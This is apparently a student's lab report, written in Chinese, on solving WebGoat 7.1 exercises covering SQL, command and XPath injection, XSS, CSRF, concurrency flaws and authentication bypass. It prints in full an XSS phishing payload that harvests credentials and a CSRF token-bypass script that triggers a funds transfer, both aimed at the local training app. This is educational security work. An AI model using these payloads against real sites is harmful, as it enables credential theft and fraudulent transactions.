<div align='center'>
	<font face = "Arial" size="6">Security Programming</font>
</div>

<div align='center'>
	<font face = "Arial" size="5">Lab 1.3 & Lab 1.4 & Lab 1.5</font>
</div>

<div align='center'>
	<font face = "Arial" size="5">Wang Haoyuan</font>
</div>

<p style="page-break-before:always;"></p>

# lab 1.3 Webgoat安装

## Java（更改为JDK1.8）

为了适配Webgoat-7.1， 因此Java版本需要降到1.8，为此需要设置另一个Java环境变量，最终效果如下：

![1715065219638](image/SP_1ab1.3&1.4&1.5_3220105114/1715065219638.png)

## Webgoat_7.1

为了符合课程要求，因此需要安装webgoat 7.1版本，对应的文件目录如下：（这四个应该都要下载）

![1715065303413](image/SP_1ab1.3&1.4&1.5_3220105114/1715065303413.png)

下载后在对应文件夹目录的命令行中输入`java -jar webgoat-container-7.1-exec.jar`即可启动前端：

![1715065461801](image/SP_1ab1.3&1.4&1.5_3220105114/1715065461801.png)

显然，访问`http://localhost:8080/WebGoat`即可进入Webgoat页面：

![1715065509594](image/SP_1ab1.3&1.4&1.5_3220105114/1715065509594.png)





# lab 1.3/4 合适的抓包工具搜索

由于本人在这一步耗掉了将近6个小时的时间，并且在1.2/1.4/1.5的三个lab的反复拷打下深度怀疑自己究竟是菜到了什么地步能在“简单”的lab中耗掉这么多时间，因此记录一下整个抓包工具的搜索流程。

首先尝试的显然是webscarab，通过网上教程成功配置好webscarab，并且能够监测到firefox定时发送的网络检测请求，但死活连不上localhost。

在经过诸如改换代理端口、改换浏览器、改换电脑代理配置等依然无效后，退而求其次换成了ZAP。

然而ZAP就图形页面上的功能似乎只能做到监听而无法修改，网上对ZAP的使用说明更是少之又少，于是再退而求其次希望换成Tamper Data（然而噩梦还没结束

在下载火狐52.8.1后，在扩展商城中只能找到**Tamper data for FF Quantum**，具体使用后发现它只能读内容，读写响应头，却唯独不能修改内容

![1715483588297](image/SP_1ab1.3&1.4&1.5_3220105114/1715483588297.png)

于是怀疑是否这个版本中，真正的**Tamper data**已经下架，于是下载火狐47.0，希望找到更早期的Tamper data（网上甚至无法找到Tamper data的发行日期）

然而火狐47.0中根本就没有**Tamper data**...

于是又返回webscarab深入寻找错误，终于找到问题出在了firefox的内置配置：

在`about config:`高级首选项中，对于localhost是否经过代理自动配置为了`false`，将其更改为`true`后，webscarab终于成功运行了...

![1715482834444](image/SP_1ab1.3&1.4&1.5_3220105114/1715482834444.png)

# lab 1.4 注入攻击/XSS练习

## injection

题目完成如下（**注：在SP作业布置网站中有明确说明：development version相关内容不做要求，在injection中涉及到的项目为：Parameterized Query 1/2**）

![1715491464175](image/SP_1ab1.3&1.4&1.5_3220105114/1715491464175.png)

### injection 1: command injection

命令行注入攻击，就是通过修改http请求参数，在同一行内执行多个命令。

由于http请求参数中，'&'字符有特殊含义，因此需要替换为*%26*来进行代替。那么整体的注入攻击语句如下所示：（以ipconfig为例）

![1715491577647](image/SP_1ab1.3&1.4&1.5_3220105114/1715491577647.png)

将ipconfig替换为其他命令，即可执行任何命令。

成功截图如下：

![1715491719594](image/SP_1ab1.3&1.4&1.5_3220105114/1715491719594.png)

### injection 2: numeric SQL injection

对数字进行注入攻击，相比于字符串更为简单（不需要考虑引号的问题），那么只需要"或"一个永为真的语句即可：

![1715491843237](image/SP_1ab1.3&1.4&1.5_3220105114/1715491843237.png)

成功截图如下：

![1715491864418](image/SP_1ab1.3&1.4&1.5_3220105114/1715491864418.png)

### injection 3: log spoofing

日志篡改就是利用在日志中执行字符串拼接，这个时候通过注入攻击可以伪造日志，从而在表面看来“似乎”完成了对应的操作（事实上只是日志本身发生了改变，实际并没有完成操作）

先尝试在user name中输入'admin', 发现日志中直接显示的就是user name：

![1715492081807](image/SP_1ab1.3&1.4&1.5_3220105114/1715492081807.png)

因此考虑在user name中额外写一行'admin'登录的报告即可（先尝试了'\n'的方法，但实际上'\'已经被转换为URL编码了，因此只能用URL编码对换行进行标识）

![1715492357898](image/SP_1ab1.3&1.4&1.5_3220105114/1715492357898.png)

成功截图如下：

![1715492374397](image/SP_1ab1.3&1.4&1.5_3220105114/1715492374397.png)

### injection 4: XPATH injection

这种注入攻击和string injection几乎一致，也是通过加入一个永远为真的式子进行注入攻击。

将语句更改为如下形式：
![1715492576379](image/SP_1ab1.3&1.4&1.5_3220105114/1715492576379.png)

之后成功获取所有人的数据：
![1715492600833](image/SP_1ab1.3&1.4&1.5_3220105114/1715492600833.png)

### injection 5: string SQL injection

字符串注入攻击就是利用SQL语法，通过输入信息对SQL语句的语义进行修改。

在本题中，姓名为Smith，目的是获取所有人的银行卡号。

那么解决方法显然是，通过非正常的输入，想办法令**where**后判断始终为true即可，本题中我使用的是`'a'='a'`语句，结果如下：

![1715066082913](image/SP_1ab1.3&1.4&1.5_3220105114/1715066082913.png)

### injection lab: SQL injection

这个模块大概是一个对SQL injection应用的测试场景。

#### stage 1: String SQL injection

类似的，如下进行注入攻击即可：
![1715492808228](image/SP_1ab1.3&1.4&1.5_3220105114/1715492808228.png)

#### stage 2(Omitted because of not required)

#### stage 3: Numeric SQL injection

通过stage 1的方法进行登录后进入List Staff page:
![1715492943128](image/SP_1ab1.3&1.4&1.5_3220105114/1715492943128.png)

刚才记下了boss的id，因此希望尝试通过直接修改id来进行访问，结果发现直接崩掉了：
![1715492990216](image/SP_1ab1.3&1.4&1.5_3220105114/1715492990216.png)

再考虑通过反向排序进行输出：

![1715493116073](image/SP_1ab1.3&1.4&1.5_3220105114/1715493116073.png)

成功截图如下：

![1715493207795](image/SP_1ab1.3&1.4&1.5_3220105114/1715493207795.png)

### injection 6: database backdoors

它与command injection类似，也是通过在同一行内执行多条语句，达成其他目的的方式。

先查询当前的工资：
![1715493302447](image/SP_1ab1.3&1.4&1.5_3220105114/1715493302447.png)

之后尝试直接打一个分号，后面接一个update语句对工资进行更改：
![1715493421662](image/SP_1ab1.3&1.4&1.5_3220105114/1715493421662.png)

直接就成功了，但还有下一步操作：
![1715493436589](image/SP_1ab1.3&1.4&1.5_3220105114/1715493436589.png)

那么与刚才一样，只需要把它给出的trigger语句复制到原来update语句位置后面即可。成功截图如下：
![1715493520181](image/SP_1ab1.3&1.4&1.5_3220105114/1715493520181.png)

### injection 7: blind numeric SQL injection

这里，我们在无法通过输出验证的情况下找出pin的值，这里只能利用好输出的布尔信息，通过不断尝试进行寻找

![1715493801529](image/SP_1ab1.3&1.4&1.5_3220105114/1715493801529.png)

通过上面的语句，我们可以去判断这个值是否大于100，如果返回为valid说明大于，如果返回invalid或者error说明小于。

多次验证之后认定数值应当是2364，输入后通过该测试：
![1715493891870](image/SP_1ab1.3&1.4&1.5_3220105114/1715493891870.png)

### injection 8: blind string SQL injection

与blind numeric SQL injection相同，判断语句如下：

![1715494162391](image/SP_1ab1.3&1.4&1.5_3220105114/1715494162391.png)

经过多次验证后认定字符串应当为'Jill',输入后通过该测试：
![1715494204989](image/SP_1ab1.3&1.4&1.5_3220105114/1715494204989.png)

## XSS

题目完成如下（**注：在SP作业布置网站中有明确说明：development version相关内容不做要求，在XSS中涉及到的项目为：Stage2/Stage4/Stage6**）

![1715671227563](image/SP_1ab1.3&1.4&1.5_3220105114/1715671227563.png)

### Phishing with XSS

网络钓鱼，是通过将代码嵌入html中，与注入攻击类似，通过更改其语义来提交错误信息。

对于本题，先弄清楚search的内容嵌入的是一个`<form>`块，因此添加一个`<\form>`结束它，之后就可以插入想要的代码了。

1. 插入一个获取credentials的html：

```html
<form name="phish"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br></form><br><br><HR>
```

2. 插入一个javascript处理两个input：

```html
<script>function hack(){ XSSImage=new Image; XSSImage.src="http://localhost:8080/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value + ""; alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + "Password = " + document.phish.pass.value);} </script> 
```

把它们拼到一起，即可完成该题：

![1715655743917](image/SP_1ab1.3&1.4&1.5_3220105114/1715655743917.png)

![1715655762020](image/SP_1ab1.3&1.4&1.5_3220105114/1715655762020.png)

![1715655774062](image/SP_1ab1.3&1.4&1.5_3220105114/1715655774062.png)

### LAB: Cross Site Scripting

与注入攻击的lab一致，是对学习的攻击知识进行应用

#### Stage 1: Stored XSS

作为Tom的身份，以正常的方式登录，抵达Edit Profile界面：

![1715670605966](image/SP_1ab1.3&1.4&1.5_3220105114/1715670605966.png)

尝试在`street`行进行插入代码：

![1715670649647](image/SP_1ab1.3&1.4&1.5_3220105114/1715670649647.png)

再使用jerry的身份正常登录，在登录后选择`ViewProfile`时发现攻击成功：

![1715670723414](image/SP_1ab1.3&1.4&1.5_3220105114/1715670723414.png)

这是因为当获取Tom的Street信息时，运行了恶意代码。

成功图片如下：

![1715670766538](image/SP_1ab1.3&1.4&1.5_3220105114/1715670766538.png)

#### Stage 2: Block Stored XSS using Input Validation(ignored)

#### Stage 3: Stored XSS Revisited

这个问题与stage 2息息相关，因此该stage也应当被忽略，但仍然可以验证其正确性：

![1715670852284](image/SP_1ab1.3&1.4&1.5_3220105114/1715670852284.png)

#### Stage 4: Block Stored XSS using Output Encoding(ignored)

#### Stage 5: Reflected XSS

以Larry的身份登录，并进入searchstaff界面：

![1715670958100](image/SP_1ab1.3&1.4&1.5_3220105114/1715670958100.png)

发现会提示错误信息后，尝试插入恶意代码：

![1715671110700](image/SP_1ab1.3&1.4&1.5_3220105114/1715671110700.png)

发现有相应的攻击结果：

![1715671125422](image/SP_1ab1.3&1.4&1.5_3220105114/1715671125422.png)

成功截图如下所示：

![1715671171611](image/SP_1ab1.3&1.4&1.5_3220105114/1715671171611.png)

#### Stage 6: Block Reflected XSS(ignored)

### Stored XSS Attacks

可存储的XSS攻击，就是当message被存储时，嵌入的攻击代码也被存储，因此造成了持续性的攻击。

本题中先测试一下title/message系统是如何工作的：

![1715656352118](image/SP_1ab1.3&1.4&1.5_3220105114/1715656352118.png)

发现它是以title-href-message的大致方式进行展示的：

![1715656394149](image/SP_1ab1.3&1.4&1.5_3220105114/1715656394149.png)

那么我们攻击的主要目标就在于在message框里面注入html代码，从而达到目的：

![1715656479978](image/SP_1ab1.3&1.4&1.5_3220105114/1715656479978.png)

之后点击hack对应的链接，发现攻击成功：

![1715656504359](image/SP_1ab1.3&1.4&1.5_3220105114/1715656504359.png)

之后显示测试通过：

![1715656518633](image/SP_1ab1.3&1.4&1.5_3220105114/1715656518633.png)

### Reflected XSS Attacks

返回式XSS攻击，是通过当输入无效的值后弹出的提示信息来进行攻击。

首先发现输入错误的密码时，会提示错误信息：

![1715657378052](image/SP_1ab1.3&1.4&1.5_3220105114/1715657378052.png)

找到突破口后，只需要在密码栏中进行攻击语句的输入即可：

![1715657435259](image/SP_1ab1.3&1.4&1.5_3220105114/1715657435259.png)

![1715657444739](image/SP_1ab1.3&1.4&1.5_3220105114/1715657444739.png)

成功信息如下：

![1715657460959](image/SP_1ab1.3&1.4&1.5_3220105114/1715657460959.png)

### CSRF

跨域请求伪造，就是通过注入URL的html语句，以这种方式绕过权限，从而“伪装”信息点击者对其他网站发送请求。

在本题的解释中，它使用了一个较为简单的例子来叙述整体作用流程：

攻击者通过注入一个img相关的html，而其中的src元素可以输入url。这个页面在加载时会为了找到该图片而访问url。

然而，如果url本身带有一定的函数操作，则会被自动执行（尤其是当用户已经获得了访问该url的权限时）。

在本例中，我们攻击的对象是attack，参数为screen和menu，那么如下输入这样的语句：

![1715659014904](image/SP_1ab1.3&1.4&1.5_3220105114/1715659014904.png)

提交后再点击链接，发现成功完成了该测试：

![1715659331507](image/SP_1ab1.3&1.4&1.5_3220105114/1715659331507.png)

### CSRF Prompt By-Pass

比CSRF更进一步，我们需要通过CSRF的方式执行两条命令，一是transferFunds = 5000，二是transferFunds = CONFIRM

那么我们相当于需要两个`img`命令（其实只要插两个命令就可以了，至于答案中提到的`onerror`方式以及`iframe`方式应当是对显式隐式进行攻击的限定）

那么与CSRF一样，输入这样的代码：

![1715669121096](image/SP_1ab1.3&1.4&1.5_3220105114/1715669121096.png)

提交之后直接运行，网页会直接给过：

![1715669149047](image/SP_1ab1.3&1.4&1.5_3220105114/1715669149047.png)

### CSRF Token By-Pass

与前两个实验一样，但本次我们需要加入对token的考虑。

先看代码中对隐藏的token部分的相关定义：

![1715669584658](image/SP_1ab1.3&1.4&1.5_3220105114/1715669584658.png)

我们发现需要对CSRFToken进行后缀补充，因此需要对它进行读取并赋值，最终html代码如下：

```html
<script>
var tokensuffix;

function readFrame1()
{
    var frameDoc = document.getElementById("frame1").contentDocument;
    var form = frameDoc.getElementsByTagName("form")[0];
    tokensuffix = '&CSRFToken=' + form.CSRFToken.value;
    
    loadFrame2();
}

function loadFrame2()
{
    var testFrame = document.getElementById("frame2");
    testFrame.src="http://localhost:8080/WebGoat/attack?Screen=XXX&menu=YYY&transferFunds=5000" + tokensuffix;
}</script>
<iframe	src="http://localhost:8080/WebGoat/attack?Screen=XXX&menu=YYY&transferFunds=main"
	onload="readFrame1();"
	id="frame1" frameborder="1" marginwidth="0"
	marginheight="0" width="800" scrolling=yes height="300"></iframe>
<iframe id="frame2" frameborder="1" marginwidth="0"
	marginheight="0" width="800" scrolling=yes height="300"></iframe>
```

将其提交：

![1715669852759](image/SP_1ab1.3&1.4&1.5_3220105114/1715669852759.png)

运行后发现正确：

![1715669883537](image/SP_1ab1.3&1.4&1.5_3220105114/1715669883537.png)

### HTTPOnly Test

这其实并不是一个题目，而是一个测试，用于对浏览器HTTPOnly的功能测试。

当HTTPOnly开启时，客户端不能对cookie进行写或者读，但仍可把它传递给服务器进行正常的连接。

测试如下（测试浏览器为firefox/125.0）:

关闭HTTPOnly进行读：

![1715670227843](image/SP_1ab1.3&1.4&1.5_3220105114/1715670227843.png)

能够成功读到`unique2u`;接下来尝试写：

![1715670253305](image/SP_1ab1.3&1.4&1.5_3220105114/1715670253305.png)

发现成功将unique2u写进去了。

打开HTTPOnly后再次尝试读：

![1715670289469](image/SP_1ab1.3&1.4&1.5_3220105114/1715670289469.png)

发现什么都读不到，接下来尝试写：

![1715670310944](image/SP_1ab1.3&1.4&1.5_3220105114/1715670310944.png)

提示也表示并没有写成功。

由此可见，对于firefox/125.0，HTTPOnly可以避免客户端对cookie进行读或写。

成功图片如下：

![1715670382751](image/SP_1ab1.3&1.4&1.5_3220105114/1715670382751.png)


# lab 1.5 网络攻击

本实验中，要求自选两种网络攻击的形式进行webgoat的实验。

我选择的是并发访问（concurrency）和 访问权限（authentication flaws）

## concurrency

完成情况如下：

![1715672722724](image/SP_1ab1.3&1.4&1.5_3220105114/1715672722724.png)

### Thread Safety Problems:

这个问题更类似于游戏中的“双开”问题。由于多线程的并发访问，此时会由于并发访问导致错误。

我们可以开启两个浏览器来测试这个问题：

![1715671666650](image/SP_1ab1.3&1.4&1.5_3220105114/1715671666650.png)

一个窗口中写jeff,一个窗口中写dave，以较慢的速度先后提交后，发现一切正常：

![1715671730183](image/SP_1ab1.3&1.4&1.5_3220105114/1715671730183.png)

但如果以快速提交，那么就会出现问题：jeff的记录被dave覆盖了，jeff注册失败：

![1715671797227](image/SP_1ab1.3&1.4&1.5_3220105114/1715671797227.png)

### Shopping Cart Concurrency Flaw:

这是一个现实场景的模拟：如何通过这个漏洞以低价购买高价物品。

那么与第一个实验原理一样，只需要让后面的订单覆盖前面的就可以了。这里选用以299价格购买1799价格的货物，先看源代码：

![1715672475519](image/SP_1ab1.3&1.4&1.5_3220105114/1715672475519.png)

这里已经可以看到，事实上在Purchase时已经生成了对应的订单，但其中的Cart可以被Update Cart用并发访问的方式挤掉，那么具体的操作流程就是：

- 买一个299的物品并点击Purchase进入待支付页面
- 在另一个界面买一个1799的物品并点击Update Cart提交
- 点击299的提交，即可购买成功

成功截图如下（被警察抓了，悲）

![1715672683478](image/SP_1ab1.3&1.4&1.5_3220105114/1715672683478.png)

## authentication flaws

本部分完成度如下：

![1715696163139](image/SP_1ab1.3&1.4&1.5_3220105114/1715696163139.png)

### Password Stength

本题主要目的就在于给出不同种类的密码，要对它们分别进行强度测试：

对123456密码：

![1715694863785](image/SP_1ab1.3&1.4&1.5_3220105114/1715694863785.png)

对abzfezd密码：

![1715694893250](image/SP_1ab1.3&1.4&1.5_3220105114/1715694893250.png)

对a9z1ezd密码：

![1715694917789](image/SP_1ab1.3&1.4&1.5_3220105114/1715694917789.png)

对aB8fEzDq密码：

![1715694944585](image/SP_1ab1.3&1.4&1.5_3220105114/1715694944585.png)

对z8!E?7D$密码：

![1715694963197](image/SP_1ab1.3&1.4&1.5_3220105114/1715694963197.png)

对My1stPassword!:Redd密码：

![1715694988315](image/SP_1ab1.3&1.4&1.5_3220105114/1715694988315.png)、

测试成功结果如下（应该是由于版本原因，答案结果比测试结果要长一个数量级）

![1715695162515](image/SP_1ab1.3&1.4&1.5_3220105114/1715695162515.png)

### forgot password

这个测试旨在告诉我们在忘记密码时测试密码问题是一件并不困难的事情。

通过输入admin进入admin的账户，尝试猜测其密保问题：

![1715695313543](image/SP_1ab1.3&1.4&1.5_3220105114/1715695313543.png)

简单猜了几个颜色后，发现`green`就是设置的答案，因此直接通过了测试：

![1715695358470](image/SP_1ab1.3&1.4&1.5_3220105114/1715695358470.png)

### multi level login 2

本测试意图通过已知TAN值，对登录方式进行修改从而登录进入其他人的账户中：

先以Joe的身份登录：

![1715695696542](image/SP_1ab1.3&1.4&1.5_3220105114/1715695696542.png)

与商店的题一样，由于已确认的Joe身份并不会被系统重复检查，于是有了可操作的空间：对第二步要求输入TAN时，可以进行打断并修改：

![1715695766741](image/SP_1ab1.3&1.4&1.5_3220105114/1715695766741.png)

尝试把Joe修改为Jane，发现成功以Jane的身份登录了：

![1715695801225](image/SP_1ab1.3&1.4&1.5_3220105114/1715695801225.png)

### multi level login 1

这个测试只是向我们介绍分层管理登录的方式。

我们先以Jane的身份登录：

![1715695870302](image/SP_1ab1.3&1.4&1.5_3220105114/1715695870302.png)

发现需要我们输入Tan #2的值，输入后再次提交：

![1715695914015](image/SP_1ab1.3&1.4&1.5_3220105114/1715695914015.png)

发现第一个stage已经完成了。那么现在我们重新登录Jane的账号，发现它要求我们给出TAN#3，然而我们只有TAN#1：

![1715696062509](image/SP_1ab1.3&1.4&1.5_3220105114/1715696062509.png)

此时我们尝试打断并将检测的TAN改成我们希望的东西：

![1715696103863](image/SP_1ab1.3&1.4&1.5_3220105114/1715696103863.png)

（把hidden_tan改为1，tan改为已知的15648）之后发现成功登录了：

![1715696134932](image/SP_1ab1.3&1.4&1.5_3220105114/1715696134932.png)

# 小结

整体而言，webgoat还是挺有意思的，我们可以通过这样一个软件对各种网络攻击进行模拟并了解攻击者角度下，对网页可以进行哪些攻击方式。

（如果除去配置抓包软件这一问题在任何地方都没有给出的话，那么总体而言完成的还算顺利（x）

再次备注：**对于必须在管理员模式下的题目（涉及到1.4的injection与XSS），在课程要求中明确给出不要求完成，因此相应的题目已被跳过。**